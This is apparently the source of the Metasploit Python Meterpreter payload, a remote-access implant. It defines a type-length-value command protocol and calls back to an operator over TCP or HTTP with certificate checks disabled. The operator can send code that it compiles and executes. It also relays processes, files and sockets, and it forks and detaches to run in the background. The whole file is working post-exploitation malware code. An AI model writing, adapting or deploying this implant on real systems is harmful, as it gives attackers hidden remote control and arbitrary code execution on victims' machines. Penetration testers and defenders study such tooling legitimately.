#!/usr/bin/python
import code
import os
import random
import select
import socket
import struct
import subprocess
import sys
import threading
import time
import traceback

try:
	import ctypes
except ImportError:
	has_windll = False
else:
	has_windll = hasattr(ctypes, 'windll')

# this MUST be imported for urllib to work on OSX
try:
	import SystemConfiguration as osxsc
	has_osxsc = True
except ImportError:
	has_osxsc = False

try:
	urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
	if sys.version_info[0] < 3:
		urllib = __import__('urllib2', fromlist=urllib_imports)
	else:
		urllib = __import__('urllib.request', fromlist=urllib_imports)
except ImportError:
	has_urllib = False
else:
	has_urllib = True

if sys.version_info[0] < 3:
	is_str = lambda obj: issubclass(obj.__class__, str)
	is_bytes = lambda obj: issubclass(obj.__class__, str)
	bytes = lambda *args: str(*args[:1])
	NULL_BYTE = '\x00'
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
	if isinstance(__builtins__, dict):
		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
		str = lambda x: __builtins__['str'](x, 'UTF-8')
	else:
		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
		str = lambda x: __builtins__.str(x, 'UTF-8')
	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
	NULL_BYTE = bytes('\x00', 'UTF-8')
	long = int
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)

#
# Constants
#

# these values may be patched, DO NOT CHANGE THEM
DEBUGGING = False
HTTP_COMMUNICATION_TIMEOUT = 300
HTTP_CONNECTION_URL = None
HTTP_EXPIRATION_TIMEOUT = 604800
HTTP_PROXY = None
HTTP_USER_AGENT = None

PACKET_TYPE_REQUEST        = 0
PACKET_TYPE_RESPONSE       = 1
PACKET_TYPE_PLAIN_REQUEST  = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1
ERROR_FAILURE_PYTHON = 2
ERROR_FAILURE_WINDOWS = 3

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM   = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL     = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED   = 0
TLV_EXTENSIONS = 20000
TLV_USER       = 40000
TLV_TEMP       = 60000

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54
TLV_TYPE_CHANNEL_PARENTID      = TLV_META_TYPE_UINT    | 55

TLV_TYPE_SEEK_WHENCE           = TLV_META_TYPE_UINT    | 70
TLV_TYPE_SEEK_OFFSET           = TLV_META_TYPE_UINT    | 71
TLV_TYPE_SEEK_POS              = TLV_META_TYPE_UINT    | 72

TLV_TYPE_EXCEPTION_CODE        = TLV_META_TYPE_UINT    | 300
TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301

TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401
TLV_TYPE_MIGRATE_PID           = TLV_META_TYPE_UINT    | 402
TLV_TYPE_MIGRATE_LEN           = TLV_META_TYPE_UINT    | 403

TLV_TYPE_CIPHER_NAME           = TLV_META_TYPE_STRING  | 500
TLV_TYPE_CIPHER_PARAMETERS     = TLV_META_TYPE_GROUP   | 501

TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503

EXPORTED_SYMBOLS = {}
EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING

def export(symbol):
	EXPORTED_SYMBOLS[symbol.__name__] = symbol
	return symbol

def generate_request_id():
	chars = 'abcdefghijklmnopqrstuvwxyz'
	return ''.join(random.choice(chars) for x in range(32))

@export
def crc16(data):
	poly = 0x1021
	reg = 0x0000
	if is_str(data):
		data = list(map(ord, data))
	elif is_bytes(data):
		data = list(data)
	data.append(0)
	data.append(0)
	for byte in data:
		mask = 0x80
		while mask > 0:
			reg <<= 1
			if byte & mask:
				reg += 1
			mask >>= 1
			if reg > 0xffff:
				reg &= 0xffff
				reg ^= poly
	return reg

@export
def error_result(exception=None):
	if not exception:
		_, exception, _ = sys.exc_info()
	exception_crc = crc16(exception.__class__.__name__)
	if exception_crc == 0x4cb2: # WindowsError
		return error_result_windows(exception.errno)
	else:
		result = ((exception_crc << 16) | ERROR_FAILURE_PYTHON)
	return result

@export
def error_result_windows(error_number=None):
	if not has_windll:
		return ERROR_FAILURE
	if error_number == None:
		error_number = ctypes.windll.kernel32.GetLastError()
	if error_number > 0xffff:
		return ERROR_FAILURE
	result = ((error_number << 16) | ERROR_FAILURE_WINDOWS)
	return result

@export
def inet_pton(family, address):
	if hasattr(socket, 'inet_pton'):
		return socket.inet_pton(family, address)
	elif has_windll:
		WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
		lpAddress = (ctypes.c_ubyte * 28)()
		lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
		if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
			raise Exception('WSAStringToAddress failed')
		if family == socket.AF_INET:
			return ''.join(map(chr, lpAddress[4:8]))
		elif family == socket.AF_INET6:
			return ''.join(map(chr, lpAddress[8:24]))
	raise Exception('no suitable inet_pton functionality is available')

@export
def packet_enum_tlvs(pkt, tlv_type = None):
	offset = 0
	while (offset < len(pkt)):
		tlv = struct.unpack('>II', pkt[offset:offset+8])
		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
				val = str(val.split(NULL_BYTE, 1)[0])
			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
				val = struct.unpack('>I', val)[0]
			elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
				val = struct.unpack('>Q', val)[0]
			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
				val = bool(struct.unpack('b', val)[0])
			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
				pass
			yield {'type':tlv[1], 'length':tlv[0], 'value':val}
		offset += tlv[0]
	raise StopIteration()

@export
def packet_get_tlv(pkt, tlv_type):
	try:
		tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
	except IndexError:
		return {}
	return tlv

@export
def tlv_pack(*args):
	if len(args) == 2:
		tlv = {'type':args[0], 'value':args[1]}
	else:
		tlv = args[0]
	data = ""
	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
	elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
		data = struct.pack('>IIQ', 16, tlv['type'], tlv['value'])
	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
	else:
		value = tlv['value']
		if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
			value = value.encode('UTF-8')
		elif not is_bytes(value):
			value = bytes(value, 'UTF-8')
		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
		elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
		elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
	return data

#@export
class MeterpreterFile(object):
	def __init__(self, file_obj):
		self.file_obj = file_obj

	def __getattr__(self, name):
		return getattr(self.file_obj, name)
export(MeterpreterFile)

#@export
class MeterpreterSocket(object):
	def __init__(self, sock):
		self.sock = sock

	def __getattr__(self, name):
		return getattr(self.sock, name)
export(MeterpreterSocket)

#@export
class MeterpreterSocketClient(MeterpreterSocket):
	pass
export(MeterpreterSocketClient)

#@export
class MeterpreterSocketServer(MeterpreterSocket):
	pass
export(MeterpreterSocketServer)

class STDProcessBuffer(threading.Thread):
	def __init__(self, std, is_alive):
		threading.Thread.__init__(self)
		self.std = std
		self.is_alive = is_alive
		self.data = bytes()
		self.data_lock = threading.RLock()

	def run(self):
		for byte in iter(lambda: self.std.read(1), bytes()):
			self.data_lock.acquire()
			self.data += byte
			self.data_lock.release()

	def is_read_ready(self):
		return len(self.data) != 0

	def peek(self, l = None):
		data = bytes()
		self.data_lock.acquire()
		if l == None:
			data = self.data
		else:
			data = self.data[0:l]
		self.data_lock.release()
		return data

	def read(self, l = None):
		self.data_lock.acquire()
		data = self.peek(l)
		self.data = self.data[len(data):]
		self.data_lock.release()
		return data

#@export
class STDProcess(subprocess.Popen):
	def __init__(self, *args, **kwargs):
		subprocess.Popen.__init__(self, *args, **kwargs)
		self.echo_protection = False

	def start(self):
		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
		self.stdout_reader.start()
		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
		self.stderr_reader.start()

	def write(self, channel_data):
		self.stdin.write(channel_data)
		self.stdin.flush()
		if self.echo_protection:
			end_time = time.time() + 0.5
			out_data = bytes()
			while (time.time() < end_time) and (out_data != channel_data):
				if self.stdout_reader.is_read_ready():
					out_data = self.stdout_reader.peek(len(channel_data))
			if out_data == channel_data:
				self.stdout_reader.read(len(channel_data))
export(STDProcess)

class PythonMeterpreter(object):
	def __init__(self, socket=None):
		self.socket = socket
		self.driver = None
		self.running = False
		self.communications_active = True
		self.communications_last = 0
		if self.socket:
			self.driver = 'tcp'
		elif HTTP_CONNECTION_URL:
			self.driver = 'http'
		self.last_registered_extension = None
		self.extension_functions = {}
		self.channels = {}
		self.interact_channels = []
		self.processes = {}
		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
			self.extension_functions[func[1:]] = getattr(self, func)
		if self.driver:
			if hasattr(self, 'driver_init_' + self.driver):
				getattr(self, 'driver_init_' + self.driver)()
			self.running = True

	def debug_print(self, msg):
		if DEBUGGING:
			print(msg)

	def driver_init_http(self):
		opener_args = []
		scheme = HTTP_CONNECTION_URL.split(':', 1)[0]
		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
			import ssl
			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
			ssl_ctx.check_hostname=False
			ssl_ctx.verify_mode=ssl.CERT_NONE
			opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
		if HTTP_PROXY:
			opener_args.append(urllib.ProxyHandler({scheme: HTTP_PROXY}))
		opener = urllib.build_opener(*opener_args)
		if HTTP_USER_AGENT:
			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
		urllib.install_opener(opener)
		self._http_last_seen = time.time()
		self._http_request_headers = {'Content-Type': 'application/octet-stream'}

	def register_extension(self, extension_name):
		self.last_registered_extension = extension_name
		return self.last_registered_extension

	def register_function(self, func):
		self.extension_functions[func.__name__] = func
		return func

	def register_function_windll(self, func):
		if has_windll:
			self.register_function(func)
		return func

	def add_channel(self, channel):
		assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
		idx = 0
		while idx in self.channels:
			idx += 1
		self.channels[idx] = channel
		return idx

	def add_process(self, process):
		idx = 0
		while idx in self.processes:
			idx += 1
		self.processes[idx] = process
		return idx

	def get_packet(self):
		packet = getattr(self, 'get_packet_' + self.driver)()
		self.communications_last = time.time()
		if packet:
			self.communications_active = True
		return packet

	def send_packet(self, packet):
		getattr(self, 'send_packet_' + self.driver)(packet)
		self.communications_last = time.time()
		self.communications_active = True

	def get_packet_http(self):
		packet = None
		request = urllib.Request(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'), self._http_request_headers)
		try:
			url_h = urllib.urlopen(request)
			packet = url_h.read()
		except:
			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
				self.running = False
		else:
			self._http_last_seen = time.time()
		if packet:
			packet = packet[8:]
		else:
			packet = None
		return packet

	def send_packet_http(self, packet):
		request = urllib.Request(HTTP_CONNECTION_URL, packet, self._http_request_headers)
		try:
			url_h = urllib.urlopen(request)
			response = url_h.read()
		except:
			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
				self.running = False
		else:
			self._http_last_seen = time.time()

	def get_packet_tcp(self):
		packet = None
		if len(select.select([self.socket], [], [], 0.5)[0]):
			packet = self.socket.recv(8)
			if len(packet) != 8:
				self.running = False
				return None
			pkt_length, pkt_type = struct.unpack('>II', packet)
			pkt_length -= 8
			packet = bytes()
			while len(packet) < pkt_length:
				packet += self.socket.recv(pkt_length - len(packet))
		return packet

	def send_packet_tcp(self, packet):
		self.socket.send(packet)

	def run(self):
		while self.running:
			request = None
			should_get_packet = self.communications_active or ((time.time() - self.communications_last) > 0.5)
			self.communications_active = False
			if should_get_packet:
				request = self.get_packet()
			if request:
				response = self.create_response(request)
				self.send_packet(response)
			else:
				# iterate over the keys because self.channels could be modified if one is closed
				channel_ids = list(self.channels.keys())
				for channel_id in channel_ids:
					channel = self.channels[channel_id]
					data = bytes()
					if isinstance(channel, STDProcess):
						if not channel_id in self.interact_channels:
							continue
						if channel.stderr_reader.is_read_ready():
							data = channel.stderr_reader.read()
						elif channel.stdout_reader.is_read_ready():
							data = channel.stdout_reader.read()
						elif channel.poll() != None:
							self.handle_dead_resource_channel(channel_id)
					elif isinstance(channel, MeterpreterSocketClient):
						while len(select.select([channel.fileno()], [], [], 0)[0]):
							try:
								d = channel.recv(1)
							except socket.error:
								d = bytes()
							if len(d) == 0:
								self.handle_dead_resource_channel(channel_id)
								break
							data += d
					elif isinstance(channel, MeterpreterSocketServer):
						if len(select.select([channel.fileno()], [], [], 0)[0]):
							(client_sock, client_addr) = channel.accept()
							server_addr = channel.getsockname()
							client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
							pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
							pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
							pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
							pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
							pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
							pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
							pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
							pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
							pkt  = struct.pack('>I', len(pkt) + 4) + pkt
							self.send_packet(pkt)
					if data:
						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
						pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
						self.send_packet(pkt)

	def handle_dead_resource_channel(self, channel_id):
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
		pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
		self.send_packet(pkt)

	def _core_loadlib(self, request, response):
		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
			return ERROR_FAILURE

		self.last_registered_extension = None
		symbols_for_extensions = {'meterpreter':self}
		symbols_for_extensions.update(EXPORTED_SYMBOLS)
		i = code.InteractiveInterpreter(symbols_for_extensions)
		i.runcode(compile(data_tlv['value'], '', 'exec'))
		extension_name = self.last_registered_extension

		if extension_name:
			check_extension = lambda x: x.startswith(extension_name)
			lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
			for method in lib_methods:
				response += tlv_pack(TLV_TYPE_METHOD, method)
		return ERROR_SUCCESS, response

	def _core_shutdown(self, request, response):
		response += tlv_pack(TLV_TYPE_BOOL, True)
		self.running = False
		return ERROR_SUCCESS, response

	def _core_channel_open(self, request, response):
		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
		handler = 'channel_open_' + channel_type['value']
		if handler not in self.extension_functions:
			return error_result(NotImplementedError), response
		handler = self.extension_functions[handler]
		return handler(request, response)

	def _core_channel_close(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		if isinstance(channel, subprocess.Popen):
			channel.kill()
		elif isinstance(channel, MeterpreterFile):
			channel.close()
		elif isinstance(channel, MeterpreterSocket):
			channel.close()
		else:
			return ERROR_FAILURE, response
		del self.channels[channel_id]
		if channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_eof(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		result = False
		if isinstance(channel, MeterpreterFile):
			result = channel.tell() >= os.fstat(channel.fileno()).st_size
		response += tlv_pack(TLV_TYPE_BOOL, result)
		return ERROR_SUCCESS, response

	def _core_channel_interact(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
		if toggle:
			if channel_id in self.interact_channels:
				self.interact_channels.remove(channel_id)
			else:
				self.interact_channels.append(channel_id)
		elif channel_id in self.interact_channels:
			self.interact_channels.remove(channel_id)
		return ERROR_SUCCESS, response

	def _core_channel_read(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		data = ''
		if isinstance(channel, STDProcess):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
			if channel.stdout_reader.is_read_ready():
				data = channel.stdout_reader.read(length)
		elif isinstance(channel, MeterpreterFile):
			data = channel.read(length)
		elif isinstance(channel, MeterpreterSocket):
			data = channel.recv(length)
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
		return ERROR_SUCCESS, response

	def _core_channel_write(self, request, response):
		channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
		channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
		length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
		if channel_id not in self.channels:
			return ERROR_FAILURE, response
		channel = self.channels[channel_id]
		l = len(channel_data)
		if isinstance(channel, subprocess.Popen):
			if channel.poll() != None:
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
			channel.write(channel_data)
		elif isinstance(channel, MeterpreterFile):
			channel.write(channel_data)
		elif isinstance(channel, MeterpreterSocket):
			try:
				l = channel.send(channel_data)
			except socket.error:
				channel.close()
				self.handle_dead_resource_channel(channel_id)
				return ERROR_FAILURE, response
		else:
			return ERROR_FAILURE, response
		response += tlv_pack(TLV_TYPE_LENGTH, l)
		return ERROR_SUCCESS, response

	def create_response(self, request):
		resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
		resp += tlv_pack(method_tlv)

		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
		resp += tlv_pack(reqid_tlv)

		handler_name = method_tlv['value']
		if handler_name in self.extension_functions:
			handler = self.extension_functions[handler_name]
			try:
				self.debug_print('[*] running method ' + handler_name)
				result, resp = handler(request, resp)
			except Exception:
				self.debug_print('[-] method ' + handler_name + ' resulted in an error')
				if DEBUGGING:
					traceback.print_exc(file=sys.stderr)
				result = error_result()
		else:
			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
			result = error_result(NotImplementedError)
		resp += tlv_pack(TLV_TYPE_RESULT, result)
		resp = struct.pack('>I', len(resp) + 4) + resp
		return resp

if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
	if hasattr(os, 'setsid'):
		try:
			os.setsid()
		except OSError:
			pass
	if HTTP_CONNECTION_URL and has_urllib:
		met = PythonMeterpreter()
	else:
		met = PythonMeterpreter(s)
	met.run()
